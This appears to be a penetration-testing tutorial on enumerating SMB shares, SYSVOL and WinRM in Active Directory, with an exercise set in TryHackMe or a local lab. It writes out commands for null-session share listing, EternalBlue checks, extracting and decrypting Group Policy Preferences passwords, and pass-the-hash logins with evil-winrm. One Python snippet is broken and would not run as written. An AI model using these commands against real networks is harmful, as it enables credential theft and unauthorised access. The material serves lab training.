# SMB, WinRM, and SYSVOL Enumeration

Enumerating file shares, remote management access, and Group Policy credential stores.

## SMB Enumeration from Linux

```bash
# List shares — null session (no credentials)
smbclient -L //DC_IP -N

# List shares with credentials
smbclient -L //DC_IP -U user%Password123

# Connect to a specific share
smbclient //DC_IP/SYSVOL -U user%Password123
smbclient //DC_IP/NETLOGON -U user%Password123
smbclient //DC_IP/C$ -U Administrator%Password123   # admin share

# SMBMap — permissions on all shares
smbmap -H DC_IP -u user -p Password123
smbmap -H DC_IP -u '' -p ''   # null session
```

## nmap SMB Scripts

```bash
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-security-mode DC_IP
nmap -p 445 --script smb-vuln-ms17-010 DC_IP   # EternalBlue check
```

## NetExec SMB Enumeration

```bash
nxc smb DC_IP -u user -p Password123 --shares
nxc smb DC_IP -u user -p Password123 --sessions    # active sessions on DC
nxc smb DC_IP -u user -p Password123 --users
nxc smb DC_IP -u user -p Password123 --groups
nxc smb DC_IP -u user -p Password123 --pass-pol    # password policy
```

## SYSVOL — Group Policy Preferences Credentials

```bash
# Mount SYSVOL and search for cpassword (stored GPP credentials)
smbclient //DC_IP/SYSVOL -U user%Password123
smb: \> recurse on
smb: \> prompt off
smb: \> mget *

# Or use find on mounted share
find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;

# Decrypt GPP password (Python)
python3 -c "
import base64
from Crypto.Cipher import AES
key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
cpassword = 'PASTE_CPASSWORD_HERE'
# use gpp-decrypt tool instead:
gpp-decrypt PASTE_CPASSWORD_HERE
"

gpp-decrypt PASTE_CPASSWORD_HERE
```

## WinRM (Remote Management)

WinRM runs on port 5985 (HTTP) and 5986 (HTTPS).  
Membership in "Remote Management Users" or "Administrators" grants access.

```bash
# Check if WinRM is accessible
nxc winrm DC_IP -u user -p Password123

# Connect with evil-winrm
evil-winrm -i DC_IP -u user -p Password123

# With hash (Pass-the-Hash)
evil-winrm -i DC_IP -u Administrator -H NTLM_HASH_HERE
```

## Exercise

On TryHackMe "Attacktive Directory" or a local lab:
1. Run `smbclient -L //DC_IP -N` — are null sessions allowed?
2. With creds: `smbmap -H DC_IP -u user -p pass` — what shares are readable/writable?
3. Connect to SYSVOL — search for XML files containing "cpassword"
4. Check WinRM: `nxc winrm DC_IP -u user -p pass` — does it return `(Pwn3d!)`?
